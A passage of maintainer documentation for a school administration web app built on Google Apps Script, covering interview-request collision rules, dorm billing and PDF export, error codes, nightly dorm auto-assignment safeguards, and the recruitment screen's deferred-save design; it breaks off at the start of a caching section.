`<` alone. Scope keeps them apart, but the name does not.

### 6.2 Interview scheduling

⚠️ **One active request per booking. Withdraw before requesting anything else.**

A booking supports **three** requests, and each is stored somewhere different:

| request | marker |
|---|---|
| 日時変更 | `BookerReq_Status` = `Pending` (cols 17-21, idx 19) |
| 交代 | `Status` = `Reassign_Pending` (+ cols 13-16, idx 5) |
| キャンセル依頼 | `Status` = `Cancel_Request` (+ `Cancel_Reason` col 23, idx 5) |

Nothing reconciled them, so a booking could carry two at once and
`getPendingNotifications` pushed **an item for each** — the 担当 saw a cancellation
and a reschedule for the same interview with nothing saying which to act on.

⚠️ The rule started as three *separate partial* checks and each one missed a
different pair. `requestReassignment` tested only `row[5] !== "Booked"` — which a
pending 日時変更 passes, because a date-change leaves the status at `Booked`.
`requestBookerDateChange` tested `Cancel_Request` only. The client disabled
キャンセルを依頼 for a date-change but not for a 交代. **The rule is now declared
once**, in `_activeRequest_(row)` / `_requireNoActiveRequest_(row)`, and all three
creators call it — including `saveScheduleBatch`.

The rule is **refuse, not supersede**. An earlier build had a cancellation silently
clear the pending request; it was rejected because the teacher's request vanished
without them doing anything.

⚠️ A rule this broad is only usable because **every** request can be withdrawn.
`withdrawActiveRequest` replaced the narrower `withdrawBookerDateChange`: it finds
whatever is active and clears it. Without it, each request would be a dead end until
the 担当 happened to act.

- ⚠️ **It clears all three markers, not just the one it reports.** Rows written
  before this rule can carry two, and healing only the reported one leaves the
  booking blocked with an empty banner — nothing on screen explaining why the
  buttons stay disabled.
- ⚠️ Ownership is the booking's teacher resolved from the **session** id, or
  admin-level — not the 担当, who already has 承認/却下 in the bell. It snapshots and
  logs like `rejectBookerDateChange` but sends no mail: there the 担当 decided, here
  the teacher is the actor.
- ⚠️ Only a *request* status is rolled back to `Booked`. A row can reach the
  withdrawal with a 日時変更 pending while `Status` is legitimately `Booked`.

⚠️ `saveScheduleBatch` validates in a **separate pass over `updatesArray` before any
write** — a throw inside the write loop would leave every earlier update in the
batch committed. ⚠️ And there it refuses only a *different* active request: a row
that is already `Cancel_Request` re-saving as `Cancel_Request` is an ordinary edit
(the 担当 changing 備考 on a slot awaiting cancellation sends the status back
unchanged), and refusing that would make the booking uneditable.

On the client, `_slotActiveRequest(slot, cStatus)` mirrors `_activeRequest_` — same
three markers, **same precedence**, so a legacy row carrying two is described the
same way on screen as in the log. One `activeReqBanner` names the active request and
carries the 取り下げ button; `_gateRequestBtn` disables **both** 日時/担当変更リクエスト
and キャンセルを依頼 with the reason in the `title`. ⚠️ The label and the title are
both restored on the enabled branch — the modal is reused across slots, so anything
left set follows the button to the next booking. ⚠️ A read-only viewer loses the
取り下げ **button**, not the banner: the banner is information, only its action is
privileged.

⚠️ **The client refuses before the update is queued**, not only on the server.
`calFlush`'s failure handler deliberately keeps a failed change
("変更は保持されています"), so a cancellation the server will always reject would sit
in `calPendingUpdates` and fail again on every later flush.

The `if`s in `getPendingNotifications` stay independent on purpose. The fix is that
the DATA can no longer hold two; a reader that hid one would leave a real
conflicting row in the sheet, unseen.

⚠️ **The 取り下げ button's label is DOM state, and the DOM outlives the modal.**
`withdrawActiveReq` swaps it to 取り下げ中... while the call is in flight, and it was
restored in exactly one place — partway down `openTeacherViewModal`, behind the slot
rendering. It reached a later open still reading 取り下げ中 on a booking nothing was
being withdrawn from. There is now one `_resetWithdrawBtn()`, called from the **top**
of the open (before anything that can throw), from `closeTeacherViewModal`, from both
handlers **before** they close or toast, and from a `catch` around the dispatch line —
a throw there fires neither handler. `closeTeacherViewModal` also clears
`window._activeReqSlot`, which `submitCancellation` reads as its local refusal.

⚠️ **A slot carrying a request must never reach the availability cycle.**
`calTeacherToggle` routes booked slots to the modal and falls through to the
None → Available → Unavailable cycle for everything else — which queues
`{status:'Available', student:""}` and **clears the booking**. `Reassign_Pending` was
missing from that list. It predates the rule above, but the rule is what sends
teachers to those slots: it tells them to open the slot and withdraw first.
`calHandleClick` carries the same list, deliberately.

`tests/reqcollision.test.js` walks the full matrix — each of the four states
(none / 日時変更 / 交代 / キャンセル) against each of the three creators — plus
withdrawal of every type, the legacy two-marker heal, and ownership.

### 6.3 Interview results
Entry warns on duplicates (name + nationality + age) but allows override.
スケジュールから読み込む imports booked interviews dated today or earlier,
skipping any student who already has a result — one record per student. Header
lookup tolerates trailing parentheticals, so 点数（面接） still maps to 点数.

### 6.4 Dorm billing and PDFs
Six bill types plus rent follow one rule: a room value replaces the building
default; blank inherits. The room detail view shows which is in effect. PDFs
render only bills with a value.

Single and bulk export share one renderer, `_buildRoomHtml_`, which returns a
**complete** HTML document. `generatePDF` converts it as-is;
`combineRoomHtmlToPdf` takes each apart with `_htmlHeadInner_` / `_htmlBodyInner_`
and emits **one** document — doctype and `<head>` once, each room's body inside a
page-break wrapper.

⚠️ The combined document **must** start with `<!DOCTYPE html>`. Without it the
renderer runs in quirks mode, where a `font-size` set on `body` does not inherit
into `<table>` elements — and this template is almost entirely tables, so every
line silently renders ~16px instead of 11px. That was the bulk export's
font-size bug.

⚠️ The two paths get their room object from **different** functions —
`getDormData` (single) and `getBuildingRoomsForExport` (bulk). Any field
`_buildRoomHtml_` reads must exist in **both**. `getBuildingRoomsForExport` once
omitted all six per-room bill overrides, so bulk PDFs printed the building
default with no error. `tests/pdfexport.test.js` asserts the two field sets are
identical.

Garbage has **five** categories, each a bilingual collection day plus a bag
type: 家庭ごみ, 燃えるゴミ(プラスチックを含む), カン・ビン・ペットボトル, プラスチック,
雑紙. They are independent and additive — a `DISPLAY_Garbage_*` tag hides any
row whose collection day is blank, so a building whose ward collects burnable
and plastic together fills in the combined category and leaves 家庭ごみ and
プラスチック empty. Bag values are stored as `"JP / EN"` and split onto two lines
for the PDF by `bagToLines`, which also upgrades pre-2026 short bag strings.

### 6.4.9 Error codes

⚠️ **Nothing a user sees names an internal thing** — not a tab, not a column, not
「スナップショット」. The ~10–20 daily users are teachers and admissions staff. Messages
produced in `Code.js` and thrown to the client count as "on screen" too.
`tests/wording.test.js` enforces this and lists the maintainer-only exceptions.

Messages a user **cannot act on** carry a code instead of an instruction. Messages
they **can** act on (「先に日時変更リクエストを取り下げてください」) keep the instruction
and get **no code** — that split is what keeps a code meaning "call the maintainer".

⚠️ **Append-only. Never renumber, never reuse a retired code** — a code in a
screenshot from six months ago must still mean the same thing.

| code | what the user sees | real cause | fix |
|---|---|---|---|
| SYS-01 | 面接スケジュールのデータが見つかりません | `Schedule_DB` tab missing or renamed | restore the tab name |
| SYS-02 | 学生データが見つかりません | `Central_DB` tab missing or renamed | restore the tab name |
| SYS-03 | 建物データが見つかりません | building id absent from `Building_Info` | check the id in `Building_Info` |
| SYS-04 | 指定のバックアップが見つかりません | snapshot sheet deleted from the snapshot spreadsheet | pick another snapshot |
| SYS-05 | バックアップの指定が正しくありません | snapshot name lacks the `__` separator — a hand-edited or truncated name | pick from the list rather than typing |
| STU-01 | 卒業生データに「決定進路」の項目がありません | `Past_DB` has no 決定進路 column | run the student sync, then re-open |
| DORM-01 | 寮の更新に必要なデータが空です | `Central_DB` or `Room_Info` under 2 rows | check the student sync ran |
| DORM-02 | 学生データに「寮」の項目が見つかりません | 寮 header renamed in `Central_DB` | restore the header name |
| DORM-03 | 学生データに「学籍番号」の項目が見つかりません | 学籍番号 header renamed in `Central_DB` | restore the header name |
| DORM-04 | 空室にする部屋が多すぎます | vacate count over `DORM_VACATE_MAX_RATIO` — usually an alias gap, not real move-outs | check `Dorm_Aliases`, then re-run 自動割当 |
| DORM-05 | 寮の自動割当が最後まで実行できませんでした | anything the nightly trigger caught; the raw message is in the report's `detail` and the execution log | read `detail`, then the execution log |
| DORM-06 | 寮の更新に必要なデータが見つかりません | one of `Central_DB` / `Building_Info` / `Room_Info` missing | restore the tab name |
| STU-02 | 学生データに「性別」の項目が見つかりません | 性別 header renamed in `Central_DB` (性別集計) | restore the header name |
| REC-01 | 保存する内容を読み取れませんでした | `saveRecruitmentBatch` got a payload it could not read — a malformed `ops` array, or an `op.t` the server has no case for. Means the page and the deployed `Code.js` disagree | reload the page; if it persists, `Index.html` and `Code.js` were deployed out of step (hard rule 5) |
| SYS-06 | システムの設定が完了していません | a required script property is unset in this project: `PHOTO_FOLDER_ID`, `UPLOADS_FOLDER_ID` or `STUDENT_SOURCE_SPREADSHEET_ID`. The execution log names the key | set it in ⚙ Project Settings → Script Properties, then run `authoriseServices` |

### 6.5 Dorm auto-assign
`Dorm_Aliases` is consulted first, then fuzzy matching. Shared-room slots are
recognised as `-2`, a space, no separator at all, or 右/左 bed labels.

**One scope, decided per room.** `syncDormsFromCentralDB` takes no `mode`:

| room | Central_DB | action |
|---|---|---|
| vacant | matches | assign |
| occupied | matches | refresh from Central_DB |
| occupied | no match | vacate, and record it |

It used to ask 空室のみ / 全部屋を上書き in a modal, with 割当テスト beside it to
preview the answer — a global wrapper over a decision the loop already makes room
by room. Both are gone, and `triggerAutoSyncStudents` runs the same function
nightly after `fetchAndMergeStudentData` (in its own try/catch: the student sync
is the important half).

⚠️ **An earlier version of this section claimed the sync "never auto-vacates an
unmatched one — it reports them". That was wrong; it vacates.** Corrected
2026-08-26.

⚠️ **The sanity gate is what makes it safe to run unattended.** Rename Central_DB's
寮 header and `dormIdx` becomes `-1`, so no student has a dorm, so **every occupied
room is a no-match and gets vacated** — and the diagnostic path that would have
caught it only runs when `updateCount === 0`, which the vacates prevent. The old
code emptied the dorms and returned 「成功！」. Survivable when a human had to pick
全部屋を上書き and click through a confirm; nightly and unattended it is a silent
wipe. So before any vacate, the vacates are dropped — **the assignments still
happen** — when the 寮 or 学籍番号 header is missing, no student has a dorm at all,
or the count exceeds `DORM_VACATE_MAX_RATIO` (0.3) of occupied rooms above a
`DORM_VACATE_MIN` floor of 5. ⚠️ The floor matters as much as the ratio: without it
a building with 4 occupied rooms could never register 2 genuine move-outs.

⚠️ Vacate candidates are **collected in the loop and written after it**. The count
arm cannot be judged one room at a time, and a vacate already written is one the
gate cannot recall.

The result is persisted to the `DORM_SYNC_REPORT` script property, returned by
`getDormData` as `lastSync`, and shown by `renderDormSyncReport` as a 要確認 panel
above the room list. ⚠️ A run that *vacated* rooms and a run whose vacates were
*held* must not read alike: the first is information (check these move-outs), the
second a warning (nothing happened, fix Central_DB).

⚠️ **The report is `edit_dorms` data even though `getDormData` is guarded by
`view_dorms`.** Everything that answers it — 自動割当, `Dorm_Aliases`, the snapshot
panel — needs edit; a view-only user was seeing a warning with nothing they could do
about it. Gated on the **data** (`lastSync: _hasPerm_(...) ? … : null`), never by
putting `permission-req` on the panel: `setupInterfaceBasedOnRole` sets `display`
from `data-orig-display` at login for every `.permission-req`, which would force the
panel visible with nothing to report and fight `renderDormSyncReport` for the same
property.

⚠️ **The report records the RUN, not just the exceptions.** It originally saved only
on the two interesting paths, so a throttled run, a swallowed throw, an empty
Central_DB and a perfectly clean run were all the same blank screen — which is
exactly how it was first reported ("I ran the trigger and no report appeared").
Every terminal path now saves, including the empty-data early return and the
trigger's own `catch`, and `_saveDormSyncReport_` derives one `status`:
`failed` → `held` → `vacated` → `clean`. ⚠️ That order matters: a held run carries
its pending labels in `rooms`, so reading rooms first would report it as `vacated` —
the opposite of what happened.

⚠️ **The 最終同期 chip is how you tell a run happened at all.**
`triggerAutoSyncStudents` is throttled by `AUTO_SYNC_MIN_GAP_SEC` (10 minutes) and
returns `"throttled"` without doing anything, so running it twice looks identical to
running it once. The chip's timestamp not moving *is* the signal, and it needs no
extra state. **自動割当 has no throttle** — that is the button for a forced run.
⚠️ The chip is emitted by `renderDormTotals`, which must stay the **single writer** of
`#dormTotals`; appending it from a second function is how the panel's ✕ got deleted
by its own renderer.

The panel shows three outcomes and they must not read alike: **failed** (it did not
run, nothing touched), **held** (it ran, refused to vacate, fix Central_DB),
**vacated** (it ran, emptied these rooms, check them). A clean run is deliberately
silent there — the chip is what says it ran.

`acknowledgeDormSyncReport` is the panel's ✕. ⚠️ **Shared, not per-browser** — "someone
has dealt with this" is a fact about the school, so it marks the stored report
(`acked`) and logs. ⚠️ It takes the report's `at` and refuses a mismatch: the nightly
run can replace the report between the page load and the click, and clearing blind
would acknowledge a warning nobody read. A new run writes a fresh object with no
`acked` field, so the next report reappears by construction — the tests pin that the
sync never writes one.

---

## 7. 募集状況 (Recruitment)

Tracks **prospective** students — a different population from the enrolled
students in Central_DB. Complementary, not duplicated.

### 7.1 Sheets

| Sheet | Columns |
|---|---|
| `Recruitment_DB` | Timestamp, 入学期, コース, 国名, 募集担当者, 人数, EnteredBy — one row per filled grid cell. ⚠️ **人数 is the GROSS**, see §7.3 |
| `Recruitment_Capacity` | 入学期, コース, 定員, 前年実績, 国名 — 国名 blank = course-level; set = per-country; `＠<地域>` = group-level |
| `Recruitment_Meta` | 種別, 値, 地域, 並び順 — 種別 is `intake` / `country` / `recruiter` / `region` |
| `Recruitment_OtherVisa` | 入学期, 番号, 国籍, 名前, 現在のビザ, ビザ変更, 課程, 担当, 松野, 学費. **Addressed positionally on both sides** — `_getOtherVisaRows_` reads by 0-based index, `saveOtherVisaCell` writes by 1-based column. Adding a column shifts both; `tests/visacolumns.test.js` asserts they stay in step, because a mismatch writes under the wrong heading without erroring |
| `Recruitment_Cancel` | 入学期, 種別, 国籍, 名前, 課程, **担当**. Positional on both sides like `Recruitment_OtherVisa`, and covered by the same test. 課程 + 国籍 + 担当 name the grid cell a cancellation is subtracted from — all three are dropdowns for that reason |
| `Recruitment_Notes` | 入学期, 内容, 更新者, 更新日時, リスト提出日, 申請日, 結果, **担当**. Two writers share a row: `saveRecruitmentNote` owns columns 2–4 and `saveRecruitmentDates` owns 5–8. They only coexist because those blocks are disjoint |

### 7.2.0 定員・残枠's total row

⚠️ **A total must equal the column printed above it.** Every cell sums the values
the rows actually *display*, skipping those rendering `-`.

**残枠 is summed, never recomputed as 定員合計 − 合計合計.** The two differ whenever a
course has no 定員: its students count toward 合計 while it contributes nothing to
定員, so the recomputed figure comes out lower and a reader adding the column up
gets a different number from the row. 前年 likewise skips the auto figure when
`lyMatched === 0` — that dash means "matched nothing", not zero. A column blank
everywhere totals `-`, not `0`.

The row sits at the end of `<tbody>`, above the three `tfoot` warnings, and carries
plain numbers: 定員 and 前年 are `<input>` per course for managers, and a typeable
total would invite an edit that saves nowhere.

### 7.2.1 `Recruitment_NotIssued` — 不交付

Applicants whose 在留資格認定証明書 was not granted. Sits beside キャンセル and shares
its dropdowns, and **means something different**:

| | names | flows into |
|---|---|---|
| キャンセル | one GRID CELL — 課程＋国籍＋担当 | `_recNet` → the grid inputs, every derived total, 定員・残枠 |
| 不交付 | one 定員・残枠 ROW — 課程 alone | 定員・残枠 only |

⚠️ **不交付 must never go through `_recNet`.** Doing so would move the recruiter
grid, changing numbers people typed under them. A row counts the moment it has a
課程; 国籍 and 担当 are recorded for reference, so a blank one still subtracts —
the opposite of the cancel rule, where all three are required.

`合計 = 在籍 + 現在 + 他ビザ − 不交付`, **clamped at 0**: more 不交付 than applicants
is a data-entry state, not a negative student count, and a negative 合計 would push
残枠 above 定員. The count has its own column so the reduction is visible; a total
that shrinks with nothing on screen explaining it is a complaint this app has had
before. Rows with a blank or out-of-scope 課程 are named in the summary's `tfoot`
alongside the 留学ビザ以外 and キャンセル warnings.

Sheet: `入学期 | 国籍 | 名前 | 課程 | 担当` (`NOTISSUED_COLS = 5`), no 種別 — it is one
category. The positional read/write pair is pinned by `tests/visacolumns.test.js`
§7.1-7.2, and the behaviour by `tests/notissued.test.js`.

### 7.3 ⚠️ The grid shows NET; `Recruitment_DB` stores GROSS

A キャンセル row is a standing **−1** on one grid cell, keyed
`コース||国名||担当`. Added 2026-08-07. Every total on the screen is net: the cell
itself, the country's 現在数, the region subtotal, 担当者計, 担当者合計, and 現在 in
定員・残枠 — and therefore 合計 and 残枠.

The input box a recruiter types into shows the **net**. `recSaveCell` adds that
cell's cancels back before writing, so `Recruitment_DB.人数` keeps meaning "ever
recruited" while the screen means "still live". Type 4 against 1 cancel → 5 stored
→ 4 displayed.

**Do NOT make the box show the stored value.** That is the ratchet: `el.value`
would be saved as the new gross, the cancel would subtract again, and the cell
walks 5 → 4 → 3 on every edit — silently, with the original unrecoverable.
`tests/cancelsubtract.test.js` §5 is exactly that scenario and was mutation-checked
against a naive implementation, which produced `4 → 3 → 2 → 1`.

The consequence, accepted deliberately with the user: **the sheet holds a figure
nobody typed.** That is invisible in normal use precisely because nobody opens the
spreadsheet — it is private and the app is the only way in — which is why it is
written down here instead.

Two supporting rules:

- **Every total goes through `_recNet`.** The same cells are summed in ten places,
  several duplicated between the render path and `recRefreshTotals`. Wiring the
  subtraction into only some of them makes 現在 stop equalling the grid printed
  directly below it — the invariant 他ビザ's separate column exists to protect.
- **A cancel missing 課程, 国籍 or 担当 subtracts from nothing and is named** in a
  red `tfoot`, exactly as `_recUnattributedVisa` does. "I recorded a cancel and no
  number moved" must never be silent. Rows whose 種別 is outside the three known
  kinds still subtract — the table does not render them, so they would otherwise
  be invisible yet counted.

### 7.2 Design points

- All totals are derived by grouping, never stored, so they cannot drift.
- **定員・残枠 counts three populations**: enrolled (Central_DB), 現在 (the
  担当者 grid), and 他ビザ — one seat per `Recruitment_OtherVisa` row that has a
  課程. 合計 is their sum; 残枠 = 定員 − 合計. 他ビザ has its own column rather
  than folding into 現在 so 現在 keeps matching the grid below it exactly;
  anyone adding that grid up by hand must get the same number.
  `recRenderCapacitySummary()` rewrites **only** `#recCapacityTable`, so it is
  safe to call while the roster below is being edited.
- 課程 on the 留学ビザ以外 roster is a `<select>` fed by
  `recCoursesForIntake()`, because that string is now grouped on and free text
  made 進学2年課程 / 進学２年課程 three different courses. ⚠️ A value already in
  the sheet that isn't in the list is carried as its own `（対象外）` option — a
  `<select>` whose value is absent from its options selects the first one and
  fires **no** change event, so the sheet would keep the old text while the UI
  showed another course. Such rows are counted nowhere, so a warning line in the
  table's `tfoot` names them.
- Courses per intake come from `REC_COURSES_BY_MONTH` in `Index.html`.
  `PlacementTest_Config` may **ADD** courses but must never override — that
  sheet configures placement *tests*, so a course running without one is
  legitimately absent from it. (July lost 日本語・文化2年課程 this way once.)
- Countries and recruiters are explicitly managed lists. Anything with data
  already entered is always rendered, so numbers can't become unreachable.
- **Nothing in 募集状況 writes as you type.** Every typed edit updates the local
  model and the derived totals in place, records an op on a queue, and paints the
  cell amber; the 保存 button (`#btnRecSave`) sends the whole session in ONE
  `saveRecruitmentBatch` call. It replaced a 1.5s debounce on the grid and on
  連絡事項, and a bare `onchange` RPC on everything else — 留学ビザ以外 alone was
  nine round trips to fill one row, and each 定員 edit cost a save *plus* a full
  `recLoad()`. See §7.4.
- 留学ビザ以外 and キャンセル rows add and delete **optimistically** — the change
  shows immediately and the server is told afterwards, with the row restored on
  failure. A new row has no `_sheetRow` until the server answers, so it carries a
  `_pendingId`, its inputs address that, and edits typed meanwhile are held and
  flushed on confirm. The flush reads the **live inputs**, not just the held
  buffer, because `onchange` has not fired for a field that still has focus.
- 連絡事項 stores HTML, sanitised on the client **and** again on the server; it's
  rendered for every user, so pasted markup is never trusted. Paste is forced to
  plain text. Manager-level to write.
- **前年 is the SAME INTAKE one year earlier** — 2027年10月 compares against
  2026年10月, not the whole of 2026. Four intakes a year, so the header names the
  month; a year-only header invites reading it as an annual total.

- ⚠️ **前年 reads `Central_DB` ONLY.** Past_DB is students who withdrew or
  graduated, and **a withdrawal frees the slot** — those rows must not count
  toward an intake's actuals. Including Past_DB made 2025年10月 進学1年6か月課程
  read 19 against a true 18; the extra row was a withdrawn student who, because
  Past_DB carries no 期 prefixes at all, fell through to the 学籍番号 fallback and
  was put back into the intake they had left. Nothing on the row marks it as
  withdrawn — the tab it lives in is the only signal.

  Consequence, and it is the intended one: an intake old enough that its students
  have all graduated out of Central_DB reports no data, and the cell renders `-`
  rather than a misleading 0. 前年 is used for the upcoming intake, one year back,
  whose students are still enrolled.

- **The intake comes from the COURSE CELL's `NN期` prefix, not 学籍番号.**
  Central_DB's course column looks like `80期_進学1年6カ月課程`. When a student
  changes course that cell is rewritten and **学籍番号 is never reissued**, so for
  exactly those students 学籍番号 names the intake they left. Bucketing by it
  counted them against the wrong year.

  `_kiIntakeMap_` derives 期 → 入学期 **from the data**: for rows carrying a given
  期, the most common 学籍番号 intake wins. Movers are the minority, so the mode is
  the 期's true intake and they are the rows that disagree. That beats an anchor
  constant — no maintenance, and it survives a renumbered or skipped 期.
  `diagnoseLastYearCounts()` prints the derived table, the source counts, and
  old-vs-new totals per intake.

  ⚠️ A first attempt parsed a `202604_` prefix and did **nothing at all** — every
  total came back identical, because the real prefixes are 期 numbers. Check
  `from the course-column prefix` in the diagnostic: 0 means nothing parsed.

- ⚠️ **`_recCourseKey_` must produce exactly what `_simNormCourseJs` produces.**
  The table looks up `recLastYear.counts[_simNormCourseJs(co)]`, so a key built
  any other way is one it can never ask for and the column shows 0.
  `_normalizeCourseKana_` alone did not strip whitespace, so any course value
  containing a space — U+3000 included — was unreachable.
  `tests/lastyear.test.js` §5 asserts the two stay in step.

- Rows whose course is a *category* (`進学`, `一般`, `短期`) rather than a course
  name match nothing and count toward no course. That is most of Past_DB. Those
  courses retire after 202507, so no mapping is invented; the cell renders `-`
  with an explanation rather than a confident `0`.

- Changing the bucketing means **renaming the cache key** (`enrolByIntakeMonth2`
  today). The old entry lives 30 minutes and otherwise serves the previous
  numbers, which looks exactly like the change not working.

- ⚠️ **Known, unfixed:** `getRecruitmentContext` documents
  `enrolled: "入学期||コース"` but builds `"||" + co` — no intake. So 合計 adds every
  enrolled student in that course **school-wide** to every intake, inflated by
  the number of live cohorts (×2 for 進学1年6か月課程, up to ×8 for
  日本語・文化2年課程, which runs in all four intakes for two years). Deliberately
  left alone; the per-intake split now exists if it is ever wanted.

### 7.4 The 保存 button — deferred writes

Every input in 募集状況 used to write as it was typed. Typing now updates the local
model and every derived total immediately (the screen must still add up while you
work), records an op on a queue, and paints the control **amber**; nothing reaches a
sheet until 保存.

**One queue, two stores.** `_recPending` keeps the grid counts — it already held the
right payload, including `prev` — and `_recDirtyOps` keeps everything else, keyed
`cap|課程|field|国名`, `cancel|行|項目`, `visa|…`, `notissued|…`, `dates`, plus the
`_recNoteDirty` flag. `recDirtyCount()` spans all of it, `_recPendingEdits` included:
those are fields typed into a row whose add has not come back yet, and they are
unsaved work like any other.

⚠️ **Every `_recDirtyOps` key is non-numeric on purpose.** JS reorders integer-like
keys to the front of an object, and `saveRecruitmentBatch` answers with a
**positional** results array — one reordered key lines every result up against the
wrong op.

⚠️ **The server DISPATCHES, it does not reimplement.** `saveRecruitmentBatch` loops
its ops into the seven existing savers. Each of those owns the permission check for
its kind (`capacity`/`note`/`dates` need `manage_recruitment`, the rest
`edit_recruitment`), its positional column map, its `_cellSafe_` wrapping, its
`_logActivity_` line and, for `saveRecruitmentCount`, the throttled snapshot §7.1's
zero-deletes depend on. The batch's own `_hasRecruitPerm_` check is a **floor**, not
a replacement — collapsing the two lets an `edit_recruitment` user reach 定員 by
putting a `capacity` op in the array.

⚠️ **Per-op try/catch.** One refused cell must not abandon the twenty behind it. The
saved ops clear, the refused ones stay queued and go red, and 保存 retries them. A
missing result reads as a failure, never as success.

⚠️ **A refused grid cell KEEPS the typed number** — the one deliberate reversal of
the old behaviour. Auto-save rolled the box back to the stored figure because there
was no retry gesture and showing the truth was the best answer available. With a
button there is one, and reverting somebody's number while the thing that would
retry it goes quiet loses the work *and* hides that anything went wrong.

⚠️ **A DELETE RENUMBERS THE QUEUE, not just the model.** `_recDropRow` shifts every
later `_sheetRow` down by one, and queued ops address a row by that same index — so
`_recShiftDirtyOps(kind, ri, ±1)` runs beside it in all three `recDelete*Row`, and
beside `_recRestoreRow` in each failure handler. Missing it leaves an outstanding
edit pointing one row too high: past the end it comes back
「対象の行が見つかりません」, and **inside** the sheet it writes to the wrong person,
silently — the worse half, and the reason this is not merely a cosmetic fix. Found on
staging at v146. It stays out of `_recDropRow` itself, which remains a pure list
function because `tests/sheetrow.test.js` transcribes it as one.

⚠️ **A re-render is the standing hazard.** `recRenderCapacitySummary` and the three
roster renderers all run mid-edit, so each ends in `_recRepaintDirty()`, ops carry a
**selector** rather than an element reference, and `_recQueueCapacity` writes back to
`recData` (see §9's model rule — that omission was the real bug found here).

⚠️ **`p.val` is already the gross.** `recSaveCell` adds the cell's cancels back when
the number is entered; `recSaveAll` sends that figure untouched. Re-deriving it from
`el.value` at save time is the 5 → 4 → 3 ratchet of §7.3.

**A RELOAD CARRIES UNSAVED WORK ACROSS.** `_recReapplyDirtyToModel()` writes every
queued value back into the freshly fetched `recData` *before* anything renders — so
the inputs come back with the typed values in them — and `_recReapplyDirtyToDom()`
re-binds the grid cells (whose elements the render replaced), restores the 日程 row,
and repaints the markers. `recLoadNote` will not overwrite a note while
`_recNoteDirty`. That is what lets someone delete a 国名, a 担当者 or a 地域, rename a
group, or reorder the recruiter columns while holding half a screen of unsaved
numbers.

⚠️ **An earlier version refused those outright** — 「先に「保存」を押してください」 on
nine 管理 paths, because each ends in a `recLoad()` that re-rendered the dirty inputs
away. The user reported it as a bug and was right: having to save a half-typed grid
before you may delete a country is exactly the coupling the 保存 button existed to
remove. Don't reintroduce it; fix the reload instead.

⚠️ **The queue belongs to ONE intake** (`_recDirtyIntake`). Ops carry no intake of
their own — `recSaveAll` reads it off the select at save time — so an op queued under
2026年10月 and saved under 2027年4月 writes to the wrong cohort. A reload therefore
keeps the queue only while the intake is unchanged, and discards it when it is not.
This is also why `recSubmitIntake` still asks: it switches intake.

**Leaving with unsaved work** — intake switch, 入学期追加, sub-tab and main-tab
changes. `#recUnsavedModal` offers **three** answers: 保存して移動 / 保存せずに移動 /
キャンセル. Its messages are actionable, so none carries a code.

⚠️ **It was a `confirm()` first, and that was wrong.** Two answers meant OK silently
threw the work away, with no one-click way to keep it — reported from staging at
v148. A modal cannot answer inline, so **`_recGuardDirty(proceed, stay)` is
asynchronous**: it returns `true` synchronously only when nothing is dirty (so every
clean navigation still costs nothing), otherwise it stores the callbacks, opens the
modal and returns `false`. Callers hand over what to do instead of reading a return
value — `switchSubTab` / `switchMainTab` / `recSubmitIntake` pass a closure that
**re-invokes themselves**, which cannot loop because the queue is empty by then.

⚠️ **保存して移動 moves only if the batch came back clean.** `recSaveAll(after)` reports
`after(allSaved)`; on a partial failure the modal closes, the red markers stay, and
the `stay` callback runs — for the intake dropdown that means the select is restored,
exactly as on キャンセル. Navigating away from the errors would hide the one thing
worth looking at.

⚠️ **`_recUnsavedTake()` clears the callback pair before running either.** Both paths
can re-enter the guard, and a stale pair fires the *previous* navigation.

⚠️ **`z-index: 10050`, above `.modal-overlay`'s 10000** — 入学期追加 can be open
underneath, and a prompt behind the dialog that raised it is unusable.

`beforeunload` stays the browser's own dialog; a page teardown cannot wait on a modal.

⚠️ **Roster ops address a row by `_sheetRow`, so the re-apply is only sound while the
reload cannot have moved those rows.** It is: everything that reaches it touches
`Recruitment_Meta`, never the three rosters. A delete *does* move them, and that is
handled separately by `_recShiftDirtyOps` above.

⚠️ **`＋行を追加` IS DEFERRED; `削除` IS NOT.** The asymmetry is deliberate and was
settled with the user.

A new row is created **locally only** — a `_pendingId`, no server call — and reaches
the sheet on 保存 as **one whole-row op** (`addvisa` / `addcancel` / `addnotissued`)
carrying every field. It counts as one item in the badge and its fields add nothing on
top: for a pending row the model row *is* the pending value, so there is deliberately
no per-field queue entry. `_recPendingRows()` derives them by scanning for
`_pendingId` rather than keeping a parallel list.

⚠️ **It was immediate until v150, and that was wrong.** Appending a blank row on click
meant 「行を追加」 always wrote whatever you did next, and 保存せずに移動 could not take
it back — it discarded the queued *field* edits and left the row behind. Reported from
staging. That change retired the whole optimistic-add apparatus
(`_recConfirmPendingRow`, `_recHoldPendingEdit`, `_recAddInFlight`, `_recPendingEdits`,
`_recPendingAdds`) and `tests/pendingrow.test.js` with it: there is no add in flight to
manage any more.

⚠️ **番号 stays blank until 保存.** `addOtherVisaRow` assigns it inside its lock; a
number invented in the browser would collide with a concurrent add. A number the user
types is sent and wins.

⚠️ **Deleting a local row must not go through `_recDropRow`.** That renumbering is
about real sheet rows a real delete shifts; the sheet never saw this one.
`_recDropPendingRow` splices and stops.

⚠️ **A landed add forces a reload even on a partly-failed batch.** Normally a partial
failure does *not* reload, so the red markers stay. But if an add succeeded while
something else failed, the model still holds that row as `_pendingId` while it now also
exists in the sheet — and the next 保存 would **create it a second time**. A duplicate
row is worse than losing the markers.

⚠️ **`REC_ADD_FIELDS` in `Code.js` is a second copy of each cell saver's column map** —
the drift class `tests/visacolumns.test.js` exists for. A column added to a saver and
not here is simply never written on a new row, silently; `tests/recsave.test.js`
compares the two in both directions.

⚠️ **`waiting` is a flag, never `!!done`.** `done` is a wrapper `recSaveAll` always
builds, so `if (done)` was true even from a plain 保存 click — which silently stopped
the post-save `recLoad()` from ever running, and with it the 残枠 / 前年 resync a 定員
edit needs. Shipped at v149, found by the suite at v150.

Row **削除 stays immediate**, so `_recDropRow` / `_recRestoreRow` / `_recShiftDirtyOps`
and `tests/sheetrow.test.js` all still apply exactly as written above.
`tests/recsave.test.js` covers all of this.

---

## 8. Caching & Performance

**Measured floor: a `google.script.run` to a function whose whole body is
`return 1` costs ~1s.** That is the HTTPS round trip, container start and parsing
all of `Code.js`, before any of our code runs. So the **number** of calls matters
far more than their size, and no server call can ever feel instant. Anything that
must feel instant has to happen without one — see optimistic writes below.

**Every separate sheet read costs ~200–400ms of fixed overhead regardless of
size.** Measured on staging: a 2-row `Announcements` read took 238ms; a
385-row `Schedule_DB` read via `getDataRange()` took 597ms, while `batchGet` of
Schedule_DB *and* Teacher_Master together took 283ms. So the number of reads
matters far more than the rows in them — which is what `_readTabs_` exists for.

| Mechanism | Applies to |
|---|---|
